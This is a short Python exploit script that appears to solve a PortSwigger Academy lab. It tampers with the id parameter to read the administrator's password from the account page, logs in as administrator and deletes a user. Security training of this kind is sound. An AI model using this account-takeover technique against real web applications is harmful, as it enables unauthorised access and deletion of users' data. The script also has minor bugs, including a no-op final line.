# Lab: User ID controlled by request parameter with password disclosure
# https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-password-disclosure

import requests
import re

session = requests.Session()
base_url = "https://ID.web-security-academy.net"

# Extract CSRF token for admin login later
login_response = session.get(f"{base_url}/login")
csrf_match = re.search(r'name="csrf" value="([^"]+)"', login_response.text)
if not csrf_match:
    print("[-] CSRF token not found")
    exit()
csrf_token = csrf_match.group(1)

# Login with wiener:peter
login_data = {"username": "wiener", "password": "peter"}
response = session.post(f"{base_url}/login", data=login_data)

# Abuse the update password functionality by changing id parameter to administrator
admin_url = f"{base_url}/my-account?id=administrator"
response = session.get(admin_url)

# extract the disclosed password from response
match = re.search(r"name=password value='([^']+)'", response.text)
if not match:
    print("Administrator password not found")
    exit()
admin_password = match.group(1)
print(f"This is the administrator password: {admin_password}")

# login as admin
admin_login = {"username": "administrator", "password": admin_password, "csrf": csrf_token}
response = session.post(f"{base_url}/login", data=admin_login)

# delete carlos
exploit_url = f"{base_url}/admin/delete?username=carlos"
response = session.get(exploit_url)
if "Congratulations" in response.text:
    print("Lab solved")

else:
    ("Exploit did not work")
